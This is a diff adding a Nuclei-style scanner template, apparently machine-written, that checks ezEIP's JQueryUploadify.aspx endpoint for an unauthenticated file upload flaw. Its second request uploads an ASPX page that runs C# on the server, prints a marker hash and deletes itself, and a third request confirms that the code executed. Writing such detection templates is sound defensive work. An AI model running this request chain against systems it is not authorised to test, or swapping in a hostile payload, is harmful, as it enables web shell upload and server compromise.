@@ -1,0 +1,59 @@
+id: ezeip-jqueryuploadify-file-upload
+
+info:
+  name: ezEIP JQueryUploadify.aspx File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Vulnerability in ezEIP's JQueryUploadify.aspx endpoint allows attackers to upload malicious files, potentially leading to system compromise.
+  reference:
+    - https://www.cnvd.org.cn/flaw/show/CNVD-2020-04888
+
+variables:
+  rand_filename: '{{rand_int(1000000, 9999999)}}.aspx'
+
+http:
+  - raw:
+      - |
+        GET /ajax/fileupload/JQueryUploadify.aspx HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - raw:
+      - |
+        POST /ajax/fileupload/JQueryUploadify.aspx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=---------------------------735323031399963166993862150
+
+        -----------------------------735323031399963166993862150
+        Content-Disposition: form-data; name="Filedata"; filename="{{rand_filename}}"
+        Content-Type: text/plain
+
+        <%@Page Language="C#"%><%Response.Write("e165421110ba03099a1c0393373c5b43");System.IO.File.Delete(Request.PhysicalPath);%>
+        -----------------------------735323031399963166993862150--
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - ".aspx"
+      - type: status
+        status:
+          - 200
+
+  - raw:
+      - |
+        GET /uploadfiles/{{rand_filename}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "e165421110ba03099a1c0393373c5b43"
+      - type: status
+        status:
+          - 200
